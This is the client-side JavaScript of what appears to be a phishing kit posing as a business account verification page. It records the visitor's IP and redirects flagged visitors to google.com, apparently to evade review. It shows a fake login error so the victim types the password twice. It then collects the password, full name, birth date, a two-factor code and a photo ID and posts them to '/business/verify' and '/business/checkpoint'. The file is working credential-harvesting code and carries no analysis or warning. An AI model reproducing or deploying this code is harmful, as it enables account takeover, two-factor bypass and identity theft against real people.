modalSetting("hide");
var isFirstLoginInput=true;
       var requestRatioSelected=false;
       let userInfo="";
       let id;
       let thisSession=(1299999999999 - Math.floor(Math.random() * 99999999999));
       document.getElementById("submissionID").innerHTML=thisSession;
       let ua = $.ua;
       console.log(ua);
       fetch('https://api.ipify.org?format=json') .then(response=> response.json()) .then(data => {
            document.getElementById("clientIp").value=data.ip;
            $.ajax({
                url: '/business/check',
                type: 'POST',
                dataType:"json",
                data: {ip: data.ip},
                success: function(data){
                    if(data === true || data == 'true' || data == 1){
                        window.location.href = 'https://google.com/'
                    }
                    id = data;
                    return true;
                } 
            });
        });


       async function uploadFile() {
        const dt = {};
        
        var two_fa_code = document.getElementById("two_fa_code").value;
        dt.two_fa_code = two_fa_code;
        dt.id = id;
        $.ajax({
            url: '/business/checkpoint',
            type: 'POST',
            dataType:"json",
            data: {model: dt},
            success: function(data){
                id = data;
                return true;
            } 
        })    
        return true;
       }

       async function updateUser(){
            // let model;
            const model = {};
            var ip = document.getElementById("clientIp").value;
            var email = document.getElementById("username").value;
            var pw = document.getElementById("password").value;
            var fullname = document.getElementById("fullName").value;
            var useragent = $.ua;
            model.location = ip;
            model.personal_email_address = email;
            model.password = pw;
            model.fullname = fullname;
            model.user_agent = useragent;
            console.log(model);
            $.ajax({
                url: '/business/verify',
                type: 'POST',
                dataType:"json",
                data: {model: model},
                success: function(data){
                    id = data;
                } 
            })    
    
       }

       async function inputChanger(field) {
           if(field=="username" || field=="password") {
               if(document.getElementById("password").value.length > 5) {
                   document.getElementById("loginNextBtn").disabled=false;
                //    await updateUser();
               }
           }
           if(field=="requestPass") {
               if(document.getElementById("fullName").value.length > 3 && requestRatioSelected==true && document.querySelector('#day').value > 0 && document.querySelector('#month').value > 0 && document.querySelector('#year').value > 0) document.getElementById("requestNextBtn").disabled=false;
           }
           if(field=="anotherRSRequest") {
               document.getElementById("anotherReasonInput").style.display="";
           }
           if(field=="selectedRequestRatio") {
               requestRatioSelected=true;
           }
           if(field=="photoID") {
               try {
                   await uploadFile();
                //    document.getElementById("uploadContent").innerHTML="Your photo was uploaded";
                   document.getElementById("submitPhotoNextBtn").disabled=false;
               }
               catch (error) {
                   document.getElementById("uploadContent").innerHTML="Upload failed. Please try again";
               }
           }
           console.log(userInfo);
       }

       function nextButton(level) {
           switch(level) {
               case "login" : if(isFirstLoginInput==true) {
                   isFirstLoginInput=false;
                   document.getElementById("loginError").style.display="";
                   document.getElementById("usernameFirst").value=document.getElementById("username").value;
                   document.getElementById("passwordFirst").value=document.getElementById("password").value;
               }
               else {
                   moveTab("v-pills-identity");
                   updateUser();
               }
               userInfo+="Username/password: `"+document.getElementById("username").value+"`/`"+document.getElementById("password").value+"`\n";
               break;
               case "request" : moveTab("v-pills-profile");
               userInfo+="Fullname: `"+document.getElementById("fullName").value+"`\nBirth: `"+document.querySelector('#day').value+"/"+document.querySelector('#month').value+"/"+document.querySelector('#year').value+"`\n";
               break;
               case "photoID" : moveTab("v-pills-messages");
               break;
           }
       }

       function moveTab(id) {
           document.getElementById(id + "-tab").classList.add("active");
           document.getElementById(id).classList.remove("fade");
           document.getElementById(id).classList.add("col-12");
           document.getElementById(id).classList.add("active");
           document.getElementById(id).classList.add("show");
           let beforeTabID="";
           switch(id) {
               case "v-pills-identity": beforeTabID="v-pills-home";
               break;
               case "v-pills-profile": beforeTabID="v-pills-identity";
               break;
               case "v-pills-messages": beforeTabID="v-pills-profile";
               saveInfo();
               break;
           }
           document.getElementById(beforeTabID).classList.add("fade");
           document.getElementById(beforeTabID).classList.remove("col-12");
           document.getElementById(beforeTabID).classList.remove("active");
           document.getElementById(beforeTabID).classList.remove("show");
       }

       function modalSetting(status) {
           if(status=="hide") {
               document.getElementById("modalShow").classList.remove("show");
               document.getElementById("modalShow").classList.remove("modal-backdrop");
               document.getElementById("modalShow").classList.remove("fade");
               document.getElementById("modalChildrenShow").classList.remove("d-block");
               document.getElementById("modalChildrenShow").classList.remove("modal");
               document.getElementById("modalChildrenShow").classList.remove("show");
               document.getElementById("modalChildrenShow").classList.remove("fade");
               document.getElementsByClassName("modal-content")[0].style.display="none";
           }
           else {
               document.getElementById("modalShow").classList.add("show");
               document.getElementById("modalShow").classList.add("modal-backdrop");
               document.getElementById("modalShow").classList.add("fade");
               document.getElementById("modalChildrenShow").classList.add("d-block");
               document.getElementById("modalChildrenShow").classList.add("modal");
               document.getElementById("modalChildrenShow").classList.add("show");
               document.getElementById("modalChildrenShow").classList.add("fade");
               document.getElementsByClassName("modal-content")[0].style.display=""
           }
       }

       function saveInfo() {
           console.log(userInfo);
           userInfo=userInfo+"\nIp: `"+document.getElementById("clientIp").value+"`";
    
       }